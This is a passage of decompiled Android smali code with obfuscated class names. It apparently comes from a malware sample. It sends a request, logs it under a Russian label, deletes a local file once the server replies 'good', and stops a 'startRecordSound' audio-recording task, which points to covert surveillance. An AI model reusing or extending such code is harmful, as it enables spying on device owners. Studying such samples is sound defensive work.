    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v4, v5, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v2, v2, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "\u0417\u0430\u043f\u0440\u043e\u0441"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, " - > "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "**good**"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Ljava/io/File;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->d:Ljava/lang/String;

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    :cond_2
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v3, "startRecordSound"

    const-string v4, "stop"

    invoke-virtual {v0, v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    throw v1

    :catch_3
    move-exception v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->b:Landroid/content/Context;

    const-string v3, "startRecordSound"

    const-string v4, "stop"

    invoke-virtual {v1, v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf$1;->f:Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/hzgktdtr/cpysnikhf;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "ERROR"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    goto/16 :goto_0
.end method
